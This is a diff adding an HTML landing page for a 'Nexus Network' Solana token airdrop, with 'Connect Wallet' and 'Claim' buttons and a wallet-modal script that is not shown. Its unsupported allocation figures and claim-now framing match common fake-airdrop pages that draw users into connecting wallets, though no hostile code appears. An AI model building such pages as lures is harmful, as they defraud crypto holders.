@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nexus Network — Solana Airdrop</title>
+<meta name="description" content="Claim your Nexus Network ($NEX) Solana Airdrop Token Allocation.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #030305;
+    --p1: #14F195;
+    --p2: #9945FF;
+    --p3: #6b21a8;
+    --accent-glow: rgba(20, 241, 149, 0.4);
+    --border: rgba(255, 255, 255, 0.08);
+    --t1: #ffffff;
+    --t2: #94a3b8;
+    --t3: #64748b;
+  }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Outfit', -apple-system, sans-serif;
+    background: var(--bg); color: var(--t1);
+    min-height: 100vh; overflow-x: hidden; -webkit-font-smoothing: antialiased;
+  }
+  .bg-elements { position: fixed; inset: 0; z-index: 0; pointer-events: none; overflow: hidden; }
+  .orb { position: absolute; filter: blur(90px); border-radius: 50%; opacity: 0.5; animation: float 20s ease-in-out infinite; }
+  .orb-1 { width: 50vw; height: 50vw; background: var(--p3); top: -20%; left: -10%; }
+  .orb-2 { width: 40vw; height: 40vw; background: rgba(153,69,255,0.3); bottom: -10%; right: -5%; animation-delay: -5s; }
+  .grid-overlay {
+    position: absolute; inset: 0;
+    background-image: linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    mask-image: radial-gradient(ellipse at center, black 20%, transparent 80%);
+    -webkit-mask-image: radial-gradient(ellipse at center, black 20%, transparent 80%);
+  }
+  @keyframes float { 0%, 100% { transform: translate(0,0) scale(1); } 50% { transform: translate(5%,5%) scale(1.05); } }
+  .app { position: relative; z-index: 2; min-height: 100vh; display: flex; flex-direction: column; }
+  .nav {
+    position: fixed; top: 0; width: 100%; height: 72px; z-index: 100;
+    display: flex; align-items: center; justify-content: space-between; padding: 0 40px;
+    background: rgba(3,3,5,0.7); backdrop-filter: blur(16px); border-bottom: 1px solid var(--border);
+  }
+  .nav-brand { display: flex; align-items: center; gap: 12px; font-weight: 700; font-size: 20px; letter-spacing: -0.5px; }
+  .nav-logo {
+    width: 36px; height: 36px; border-radius: 10px;
+    background: linear-gradient(135deg, var(--p1), var(--p2));
+    display: flex; align-items: center; justify-content: center;
+    font-weight: 800; font-size: 18px; color: #000;
+    box-shadow: 0 0 20px var(--accent-glow);
+  }
+  .nav-links { display: flex; gap: 32px; font-weight: 500; }
+  .nav-links a { color: var(--t2); text-decoration: none; transition: 0.3s; font-size: 14px; }
+  .nav-links a:hover { color: var(--t1); }
+  .btn { font-family: inherit; font-weight: 600; cursor: pointer; border: none; outline: none; border-radius: 12px; transition: 0.3s; }
+  .btn-nav {
+    padding: 10px 24px; font-size: 14px; color: #000;
+    background: linear-gradient(135deg, var(--p1), var(--p2));
+    box-shadow: 0 4px 15px var(--accent-glow);
+  }
+  .btn-nav:hover { transform: translateY(-2px); box-shadow: 0 8px 25px var(--accent-glow); filter: brightness(1.1); }
+  .hero { text-align: center; padding: 140px 20px 40px; margin: 0 auto; max-width: 800px; animation: fadeUp 0.8s ease-out; }
+  @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+  .tagline {
+    display: inline-block; padding: 6px 16px; border-radius: 100px; font-size: 13px; font-weight: 600;
+    background: rgba(20,241,149,0.1); border: 1px solid rgba(20,241,149,0.2);
+    color: var(--p1); margin-bottom: 24px; letter-spacing: 0.5px; text-transform: uppercase;
+  }
+  .hero h1 { font-size: clamp(36px,6vw,64px); font-weight: 800; line-height: 1.1; margin-bottom: 20px; letter-spacing: -1.5px; }
+  .text-gradient { background: linear-gradient(to right, #fff, var(--p2)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+  .hero p { font-size: clamp(16px,2vw,18px); color: var(--t2); max-width: 540px; margin: 0 auto 40px; line-height: 1.6; }
+  .stats { display: flex; justify-content: center; gap: 48px; margin-bottom: 60px; }
+  .stat-item { text-align: center; }
+  .stat-value { font-size: 28px; font-weight: 700; color: var(--t1); margin-bottom: 4px; letter-spacing: -0.5px; }
+  .stat-label { font-size: 12px; color: var(--t3); text-transform: uppercase; letter-spacing: 1px; font-weight: 600; }
+  .btn-claim {
+    padding: 18px 48px; font-size: 17px; color: #000; font-weight: 700;
+    background: linear-gradient(135deg, var(--p1), var(--p2)); border-radius: 14px;
+    box-shadow: 0 8px 25px var(--accent-glow);
+  }
+  .btn-claim:hover { transform: translateY(-2px); filter: brightness(1.1); box-shadow: 0 12px 30px var(--accent-glow); }
+  .footer { padding: 40px 20px; text-align: center; border-top: 1px solid var(--border); margin-top: auto; }
+  .footer-links { display: flex; justify-content: center; gap: 30px; margin-bottom: 20px; }
+  .footer-links a { color: var(--t3); font-size: 14px; text-decoration: none; transition: 0.2s; font-weight: 500; }
+  .footer-links a:hover { color: var(--t2); }
+  .footer-copy { font-size: 13px; color: #475569; }
+  @media (max-width: 768px) {
+    .nav { padding: 0 20px; }
+    .nav-links { display: none; }
+    .hero { padding: 120px 20px 30px; }
+    .stats { gap: 24px; flex-wrap: wrap; }
+    .stat-value { font-size: 24px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="bg-elements">
+  <div class="orb orb-1"></div>
+  <div class="orb orb-2"></div>
+  <div class="grid-overlay"></div>
+</div>
+
+<div class="app">
+  <nav class="nav">
+    <div class="nav-brand">
+      <div class="nav-logo">N</div>
+      Nexus Network
+    </div>
+    <div class="nav-links">
+      <a href="#">Ecosystem</a>
+      <a href="#">Bridge</a>
+      <a href="#">Security</a>
+      <a href="#">Docs</a>
+    </div>
+    <div>
+      <button class="btn btn-nav" onclick="openWalletModal()">Connect Wallet</button>
+    </div>
+  </nav>
+
+  <div class="hero">
+    <div class="tagline">Phase 1 Distribution Live</div>
+    <h1>Claim Your <span class="text-gradient">$NEX</span> Allocation</h1>
+    <p>The Solana revolution is here. Eligible Solana active users, early adopters, and liquidity providers can now claim the official Nexus Network token.</p>
+    <div class="stats">
+      <div class="stat-item"><div class="stat-value">250M</div><div class="stat-label">$NEX Allocated</div></div>
+      <div class="stat-item"><div class="stat-value">1.4M+</div><div class="stat-label">Eligible Wallets</div></div>
+      <div class="stat-item"><div class="stat-value">Solana</div><div class="stat-label">Network</div></div>
+    </div>
+    <button class="btn btn-claim" onclick="openWalletModal()">CLAIM $NEX &rarr;</button>
+  </div>
+
+  <div class="footer">
+    <div class="footer-links">
+      <a href="#">Whitepaper</a>
+      <a href="#">Github</a>
+      <a href="#">Twitter</a>
+      <a href="#">Terms &amp; Conditions</a>
+    </div>
+    <div class="footer-copy">&copy; 2026 Nexus Protocol Labs. All rights reserved.</div>
+  </div>
+</div>
+
+<script type="module" src="/src/main.js"></script>
+</body>
+</html>
